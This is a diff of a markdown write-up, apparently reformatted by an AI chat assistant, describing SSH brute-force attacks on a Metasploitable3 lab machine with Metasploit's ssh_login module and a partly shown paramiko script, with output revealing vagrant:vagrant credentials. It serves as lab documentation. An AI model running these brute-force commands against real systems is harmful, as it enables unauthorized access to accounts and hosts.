@@ -1,15 +1,25 @@
-Phase 1: SSH Service Compromise
-Overview
-This phase demonstrates SSH brute force attacks against Metasploitable3 using:
+Here’s the revised content with the outputs placed in distinguished boxes for better clarity:
 
-Metasploit Framework (ssh_login module)
-Custom Python brute force script
-Successfully identified vulnerable credentials:
-vagrant:vagrant
-Attack Methodologies
-1. Metasploit Brute Force Attack
-Configuration:
-bash
+---
+
+# Phase 1: SSH Service Compromise  
+
+---
+
+## Overview  
+This phase demonstrates SSH brute force attacks against Metasploitable3 using:  
+- Metasploit Framework (`ssh_login` module)  
+- Custom Python brute force script  
+- Successfully identified vulnerable credentials:  
+  `vagrant:vagrant`  
+
+---
+
+## Attack Methodologies  
+
+### 1. Metasploit Brute Force Attack  
+#### Configuration:  
+```bash
 use auxiliary/scanner/ssh/ssh_login
 set RHOST 192.168.56.102
 set RPORT 22
@@ -17,18 +27,26 @@ set USER_FILE /absolute/path/usernames.txt
 set PASS_FILE /absolute/path/passwords.txt
 set THREADS 3
 run
-Output:
-Code
+```
+
+#### **Output:**  
+```
 [*] 192.168.56.102:22 - Starting brute force
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-Key Findings:
-Required absolute paths for credential files
-Case-sensitive commands (e.g., set, not SET)
-Full scan of the target system successfully completed
-2. Custom Python Brute Force Script
-Script: compromise.py
-Python
+```
+
+#### **Key Findings:**  
+- Required absolute paths for credential files  
+- Case-sensitive commands (e.g., `set`, not `SET`)  
+- Full scan of the target system successfully completed  
+
+---
+
+### 2. Custom Python Brute Force Script  
+
+#### Script: `compromise.py`  
+```python
 import paramiko
 import time
 
@@ -96,16 +114,32 @@ def main():
 
 if __name__ == "__main__":
     main()
-Execution:
-bash
+```
+
+#### **Execution:**  
+```bash
 python3 compromise.py
-Output:
-Code
+```
+
+#### **Output:**  
+```
 [+] Successfully logged in as vagrant:vagrant
-Discovered Credentials
-Username: vagrant
-Password: vagrant
-Requirements
-Metasploit Framework (v6.3+)
-Python 3.8+
-Paramiko (Install via pip install paramiko)
+```
+
+---
+
+## Discovered Credentials  
+- **Username:** `vagrant`  
+- **Password:** `vagrant`  
+
+---
+
+## Requirements  
+
+- Metasploit Framework (v6.3+)  
+- Python 3.8+  
+- Paramiko (Install via `pip install paramiko`)  
+
+--- 
+
+Let me know if you need further refinements!
